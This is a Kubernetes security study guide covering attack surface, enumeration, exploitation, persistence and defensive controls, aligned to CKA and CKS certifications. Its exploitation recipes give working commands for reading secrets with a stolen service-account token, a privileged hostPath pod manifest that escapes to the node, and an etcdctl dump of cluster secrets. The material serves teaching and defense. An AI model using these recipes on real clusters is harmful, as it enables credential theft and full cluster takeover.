# Kubernetes Orchestration Security

Kubernetes is the reference implementation of a modern orchestrator, and
its security model is the most studied of any orchestration platform. The
control plane is an API server backed by etcd, with admission plugins that
can mutate or reject every request. The data plane is a set of kubelets,
each running a container runtime on one node.

The attack surface follows the architecture: an exposed or weakly
authenticated API server is game over, an over-permissive RBAC model
turns any workload token into control-plane access, and a misconfigured
kubelet hands an attacker the node. This file covers each of those
surfaces in the offensive track, and the corresponding controls in the
defensive track.

## 1. Overview

The Kubernetes control plane has four critical components:

- **kube-apiserver** - the only component that talks to etcd; every other
  component talks to it. Authentication, authorization and admission all
  happen here.
- **etcd** - the key-value store holding the full cluster state,
  including secrets. Direct etcd access is equivalent to cluster-admin.
- **kube-scheduler and controller-manager** - decide where pods run and
  reconcile desired state.
- **kubelet** - the node agent that actually starts containers. It has a
  local API on port 10250 (authenticated) and, historically, 10255
  (unauthenticated, read-only, removed in recent versions).

Every request follows the same path: authenticate -> authorize (RBAC) ->
admit (mutating webhooks -> validating webhooks) -> persist to etcd. A
weakness in any step is a cluster compromise.

## 2. Reconnaissance / Enumeration

From outside, the API server is usually on port 6443. A version probe
tells you which CVEs may apply:

```bash
curl -k https://10.0.0.1:6443/version
```

Expected output (trimmed):

```json
{
  "major": "1",
  "minor": "28",
  "gitVersion": "v1.28.3"
}
```

Anonymous access test: if the API returns 200 on a resource listing
without a token, the cluster is misconfigured.

From inside a pod, the service account token is mounted by default. It
identifies the pod's identity to the API server, and its permissions are
whatever RBAC grants to that service account.

## 3. Common Attack Vectors

- **Anonymous or weakly authenticated API server** - reachable from the
  internet with `--anonymous-auth=true` or a weak client certificate.
- **Exposed etcd** - port 2379 open, no client cert required, full read
  of secrets and cluster state.
- **Kubelet API exposure** - port 10250 with `--anonymous-auth=true` or
  `--authorization-mode=AlwaysAllow`, allowing `exec` into any pod.
- **Over-privileged service accounts** - a workload token bound to a
  role with `get secrets`, `create pods`, or wildcard verbs.
- **Admission bypass** - a webhook configured with `failurePolicy: Ignore`
  or a namespace exempt from policy.
- **Container runtime escapes** - `privileged: true`, `hostPath: /`,
  `hostPID`, `hostNetwork`, `hostIPC`.

## 4. Exploitation Recipes

From a pod with a mounted token, enumerate the identity:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

If the token can read secrets in the namespace, extract every credential
the workload was given. If it can create pods, schedule a privileged pod
that mounts the node:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: node-access
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: shell
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

Then `kubectl exec -it node-access -- chroot /host` reaches the node.

Direct etcd access, when port 2379 is exposed without TLS client auth:

```bash
etcdctl --endpoints=http://10.0.0.1:2379 get / --prefix --keys-only
```

The listing shows every object in the cluster; `get /registry/secrets`
returns the raw secret values.

## 5. Post-Exploitation

Persistence in Kubernetes looks like a controller or a binding:

- `ClusterRoleBinding` to `cluster-admin` for a new service account.
- A DaemonSet that runs on every node and calls back to the attacker.
- A mutated admission webhook that injects a sidecar into future pods.
- A new `kubeconfig` file stored in a secret the attacker can read.

Cloud pivot: pods on EKS, GKE or AKS often carry a cloud identity via
instance metadata or workload identity. Reading that identity is the step
from cluster to cloud account.

## 6. Risk Context (Offensive)

The impact of a Kubernetes compromise is the union of every namespace,
secret and node in the cluster, plus whatever cloud identity the cluster
holds. A single misconfigured API server can expose all of it.

The realistic attack paths are:

- External -> API server (weak auth) -> cluster-admin.
- Workload -> service account -> secrets -> node via privileged pod.
- Workload -> cloud identity -> cloud account.
- Supply chain -> admission webhook -> every future pod.

## 7. Root Causes (Defensive)

- Default RBAC in tutorials grants far more than a real workload needs.
- Service account tokens are automounted even when the workload never
  calls the API.
- Admission policy is added late, after workloads already exist.
- etcd and kubelet are trusted because they are "internal", but internal
  networks are not a security boundary.
- Cloud identity is attached to pods without narrowing its permissions.

## 8. Preventive Controls (Defensive)

- Disable anonymous auth on the API server and kubelet; require client
  certificates or OIDC.
- Restrict API server and kubelet network exposure to trusted networks.
- Set `automountServiceAccountToken: false` on workloads that do not
  need the API.
- Enforce RBAC least privilege: no wildcards, no default `cluster-admin`.
- Apply Pod Security Standards (restricted profile) plus policy engines
  (OPA Gatekeeper, Kyverno) to reject privileged, hostPath, hostPID and
  hostNetwork pods.
- Encrypt etcd at rest and restrict access to it with mutual TLS.
- Use workload identity with narrow cloud permissions, not node-level
  instance roles.

## 9. Detection Controls (Defensive)

- Audit-log the API server and alert on creation of `cluster-admin`
  bindings, new DaemonSets, and webhook changes.
- Alert on `kubectl exec`, `port-forward` and `attach` against
  production namespaces.
- Detect pods with `privileged: true`, `hostPath`, `hostPID`,
  `hostNetwork` in namespaces that should not allow them.
- Monitor etcd for direct access from unexpected sources.
- Correlate RBAC changes with Git: an out-of-band role binding is a
  red flag.

## 10. Verification (Defensive)

- Run `kubectl auth can-i --list` for every service account and review
  the result.
- Submit a test manifest that requests `privileged: true` and confirm it
  is rejected.
- Confirm `automountServiceAccountToken` is false on workloads that do
  not call the API.
- Confirm the API server rejects anonymous requests (`curl -k
  https://<api>/api` returns 401 or 403).
- Confirm etcd requires client certificates.
- Confirm audit logs are shipped off-node and retained.

## Certification Alignment

- **CKA** - cluster architecture, RBAC, admission control, API server
  configuration.
- **CKS** - cluster hardening, supply chain security, runtime security,
  microservice security.
- **AWS Certified Security - Specialty** - EKS control plane, IAM to
  RBAC mapping, audit logging.

## References

- Kubernetes API concepts - https://kubernetes.io/docs/reference/using-api/
- Kubernetes RBAC - https://kubernetes.io/docs/reference/access-authn-authz/rbac/
- Kubernetes admission controllers - https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/
- Pod Security Standards - https://kubernetes.io/docs/concepts/security/pod-security-standards/
- NIST SP 800-190, Application Container Security Guide - https://csrc.nist.gov/pubs/sp/800/190/final